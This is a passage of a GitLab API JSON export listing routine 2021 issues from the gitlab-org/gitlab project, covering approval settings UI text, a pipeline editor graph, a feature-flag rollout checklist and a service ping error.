Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"}],"author":{"id":7971452,"username":"teresatison","name":"Teresa Tison","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7971452/avatar.png","web_url":"https://gitlab.com/teresatison"},"type":"ISSUE","assignee":{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"},"user_notes_count":56,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337531","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337531","notes":"https://gitlab.com/api/v4/projects/278964/issues/337531/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337531/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337531","relative":"#337531","full":"gitlab-org/gitlab#337531"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91380789,"iid":337525,"project_id":278964,"title":"Follow-up: Change approval settings from a success alert to a success toast","description":"As per https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66536#note_640849831 it was identified that Pajamas recommends we use a success toast and an error alert rather than alerts for both success and error.\n\nAs the approval settings spans both groups and projects, this change has been put into this issue instead.\n\n### Implementation plan\n\n~frontend - :one:\n\n1. Replace http://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/assets/javascripts/approvals/components/approval_settings.vue#L104 with a [GlToast](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-toast--default)\n1. Update spec tests","state":"closed","created_at":"2021-08-03T14:46:38.451Z","updated_at":"2022-01-25T19:38:27.175Z","closed_at":"2022-01-14T10:46:00.456Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Enterprise Edition","SUS::Impacting","UI polish","UX","auto updated","devops::manage","feature::enhancement","frontend","group::compliance","priority::1","section::dev","severity::4","type::feature","workflow::in review"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":6,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337525","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337525","notes":"https://gitlab.com/api/v4/projects/278964/issues/337525/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337525/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337525","relative":"#337525","full":"gitlab-org/gitlab#337525"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5957,"epic":{"id":266916,"iid":5957,"title":"Group-level settings for merge request approval SETTINGS in child projects","url":"/groups/gitlab-org/-/epics/5957","group_id":9970,"human_readable_end_date":"Jan 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":91380350,"iid":337523,"project_id":278964,"title":"Follow-up: Update the approval settings options text","description":"With https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66536 we have updated the projects approval settings to use the same Vue components as the group approval settings.\n\nDuring this process, it was determined that the approval settings options text could be improved to make the settings easier to read and understand.\n\n\n## Proposal\n\nTherefore, we should update the text set in http://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/assets/javascripts/approvals/constants.js#L52 to:\n\n**Admin Area: Merge request approval settings**\n```text\n- [ ] Prevent approval by author.\n- [ ] Prevent approvals by users who add commits.\n- [ ] Prevent editing approval rules in projects and merge requests. \n```\n\n**Group: Merge request approval settings**\n```text\n- [ ] Prevent approval by author.\n- [ ] Prevent approvals by users who add commits.\n- [ ] Prevent editing approval rules in projects and merge requests. \n- [ ] Require user password to approve.\n- [ ] Remove all approvals when commits are added to the source branch.\n```\n\n**Project: Merge request approval settings**\n```text\n- [ ] Prevent approval by author.\n- [ ] Prevent approvals by users who add commits.\n- [ ] Prevent editing approval rules in merge requests.\n- [ ] Require user password to approve.\n- [ ] Remove all approvals when commits are added to the source branch.\n```\n\n**Create a consistent heading and description, and remove individual help links**\n\n```text\nApproval settings\nDefine how approval rules are applied as a merge request moves toward completion. Learn more\n```\n\n## Implementation\n\n1. Update the [`ApprovalSettings`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/assets/javascripts/approvals/components/approval_settings.vue#L102) component to render the `ApprovalSettingsCheckbox` in the suggested order. (Done → ba8742e8af1ec77d12d2ee01066affaa4ba2a1f2)\n1. Update strings in `_merge_request_approvals_fields.html.haml` to match the admin area suggestions.\n1. Update docs","state":"closed","created_at":"2021-08-03T14:39:53.453Z","updated_at":"2021-08-24T08:28:10.028Z","closed_at":"2021-08-24T08:28:10.009Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Enterprise Edition","Technical Writing","UI text","auto updated","devops::manage","feature::enhancement","frontend","group::compliance","priority::1","section::dev","tw-weight::3","type::feature","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337523","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":13,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 13 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337523","notes":"https://gitlab.com/api/v4/projects/278964/issues/337523/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337523/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337523","relative":"#337523","full":"gitlab-org/gitlab#337523"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5957,"epic":{"id":266916,"iid":5957,"title":"Group-level settings for merge request approval SETTINGS in child projects","url":"/groups/gitlab-org/-/epics/5957","group_id":9970,"human_readable_end_date":"Jan 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91373879,"iid":337515,"project_id":278964,"title":"Translate month names for CI minutes in GraphQL","description":"Localize `ciMinutesUsage.nodes.month` in GraphQL","state":"closed","created_at":"2021-08-03T13:10:34.238Z","updated_at":"2021-10-28T13:54:25.189Z","closed_at":"2021-08-24T15:48:39.581Z","closed_by":{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"},"labels":["Category:Continuous Integration","devops::verify","group::pipeline execution","section::ops","type::maintenance","workflow::production"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"}],"author":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"type":"ISSUE","assignee":{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337515","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337515","notes":"https://gitlab.com/api/v4/projects/278964/issues/337515/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337515/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337515","relative":"#337515","full":"gitlab-org/gitlab#337515"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"needs_attention"},{"id":91373612,"iid":337514,"project_id":278964,"title":"Add pipeline mini graph to the pipeline editor","description":"### Release notes\n\nTracking the status of a running pipeline involves significant context switching. One has to go to the pipeline page to view the pipeline run. Currently, the pipeline editor only show the overall pipeline status and provides the \"View pipeline\" link. In this release, we are adding to the pipeline editor the pipeline mini graph to make it easy for you to navigate to individual jobs and track their status from the pipeline editor.\n\n\n\n## 🧩 Problem\n\nTracking the status of a running pipeline involves significant context switching. One has to go to the pipeline page to view the pipeline run. \n\nCurrently, we only show the overall pipeline status and provide the \"View pipeline\" link.\n\n![image](/uploads/0da7a9f04327a7257dbd8dfcc2993a5d/image.png)\n\nThis is a follow up issue from https://gitlab.com/gitlab-org/gitlab/-/issues/36118#note_641861365\n\n### Proposal\n\nAdd the mini pipeline graph to the pipeline editor to make it easy to navigate to individual jobs and track their status from the pipeline editor.\n\n- Add the mini pipeline graph (with the linked pipeline) to the pipeline editor pipeline status section. \n- The mini pipeline graph can take up the space between the status text and the \"View pipeline\" button, with 16px space on both sides. When there's no more space left, it should wrap as it does in the pipelines list view. When the graph wraps on the second line, it should be vertically centered inside the pipeline status section.\n- Remove the link from the pipeline ID in the pipeline status text (it's no longer needed with the clear \"View pipeline\" CTA and the mini pipeline graph).\n\n![image](/uploads/ee8d01cc1693d564f8c49c0c84a7fcca/image.png)","state":"closed","created_at":"2021-08-03T13:07:13.402Z","updated_at":"2021-11-18T07:01:55.081Z","closed_at":"2021-11-04T08:35:40.247Z","closed_by":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"labels":["Category:Pipeline Authoring","Deliverable","UX","auto updated","candidate::14.4","devops::verify","feature::enhancement","frontend","group::pipeline authoring","release post item::in review","section::ops","type::feature","usability","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"user_notes_count":26,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337514","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337514","notes":"https://gitlab.com/api/v4/projects/278964/issues/337514/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337514/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337514","relative":"#337514","full":"gitlab-org/gitlab#337514"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91368410,"iid":337507,"project_id":278964,"title":"[Feature flag] Rollout of `ci_include_rules`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the conditional includes feature](https://gitlab.com/gitlab-org/gitlab/-/issues/276515) on production,\nthat is currently behind the `ci_include_rules` feature flag.\n\nMR: !67409\n\nDocumentation: https://docs.gitlab.com/ee/ci/yaml/index.html#rules-with-include\n\n## Owners\n\n- Team: ~\"group::pipeline authoring\"\n- Most appropriate slack channel to reach out to: `#g_pipeline-authoring`\n- Best individual to reach out to: @furkanayhan \n- PM: @dhershkovitch \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n- Rollout on GitLab.com for a certain period (How long)\n- Percentage Rollout on GitLab.com\n- Rollout Feature for everyone as soon as it's ready\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can also be useful to review --\u003e\n\n## Testing Groups/Projects/Users\n\n\u003c!-- If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example. --\u003e\n\n- `gitlab-org/gitlab` project\n- `gitlab-org`/`gitlab-com` groups\n- ...\n\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- [ ] Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set ci_include_rules true --dev`\n    - [x] `/chatops run feature set ci_include_rules true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [x] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [x] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e ci_include_rules true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set ci_include_rules \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_include_rules \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_include_rules true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_include_rules`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_include_rules` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete ci_include_rules --dev`\n    - [ ] `/chatops run feature delete ci_include_rules --staging`\n    - [ ] `/chatops run feature delete ci_include_rules`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_include_rules false\n```","state":"closed","created_at":"2021-08-03T11:43:09.483Z","updated_at":"2021-12-07T03:40:28.225Z","closed_at":"2021-10-13T08:08:55.484Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","backend","devops::verify","feature flag","group::pipeline authoring","section::ops","type::maintenance","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337507","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":12},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"12 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337507","notes":"https://gitlab.com/api/v4/projects/278964/issues/337507/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337507/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337507","relative":"#337507","full":"gitlab-org/gitlab#337507"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91363919,"iid":337504,"project_id":278964,"title":"Integrate Dependency Proxy test with SAML instance","description":"To better ensure we test Dependency Proxy, and prevent [regressions](https://gitlab.com/gitlab-org/gitlab/-/issues/294018) we can integrate with existing SAML scenarios.","state":"closed","created_at":"2021-08-03T10:25:56.835Z","updated_at":"2022-10-18T07:05:38.148Z","closed_at":"2021-10-04T13:53:45.301Z","closed_by":{"id":4763342,"username":"svistas","name":"Sofia Vistas","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4763342/avatar.png","web_url":"https://gitlab.com/svistas"},"labels":["Category:Dependency Proxy","Deliverable","Package:P1","Quality","auto updated","devops::package","group::package registry","missed-deliverable","missed:14.3","reliability","section::ops","workflow::in review"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":4763342,"username":"svistas","name":"Sofia Vistas","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4763342/avatar.png","web_url":"https://gitlab.com/svistas"}],"author":{"id":4763342,"username":"svistas","name":"Sofia Vistas","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4763342/avatar.png","web_url":"https://gitlab.com/svistas"},"type":"ISSUE","assignee":{"id":4763342,"username":"svistas","name":"Sofia Vistas","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4763342/avatar.png","web_url":"https://gitlab.com/svistas"},"user_notes_count":8,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337504","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337504","notes":"https://gitlab.com/api/v4/projects/278964/issues/337504/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337504/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337504","relative":"#337504","full":"gitlab-org/gitlab#337504"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7715,"epic":{"id":467187,"iid":7715,"title":"Container Registry  \u0026 Dependency Proxy End to End Testing","url":"/groups/gitlab-org/-/epics/7715","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91355157,"iid":337497,"project_id":278964,"title":"Submit Service ping fails sometimes with Invalid usage_data_id in response","description":"We noticed that Service ping fails sometimes when submitting to Version App with error\n\n```ruby\nInvalid usage_data_id in response\n```\n\n\nSee case https://gitlab.com/gitlab-org/gitlab/-/issues/336716#note_641671669\n\nWhen I tried the first time from my computer it failend.\n\nWhen running the second time it worked, and I could not reproduce it.\n\nThis should be investigated and fixed\n\n## Details \n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/service_ping/submit_service.rb#L36\n\n```\n# service_ping/submit_service.rb\n      unless version_usage_data_id.is_a?(Integer) \u0026\u0026 version_usage_data_id \u003e 0\n        raise SubmissionError, \"Invalid usage_data_id in response: #{version_usage_data_id}\"\n      end\n\n```\n\ncc @gitlab-org/growth/product-intelligence/engineers","state":"closed","created_at":"2021-08-03T08:34:17.280Z","updated_at":"2021-11-22T08:53:34.956Z","closed_at":"2021-10-15T08:06:17.373Z","closed_by":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"labels":["backend","devops::growth","group::product 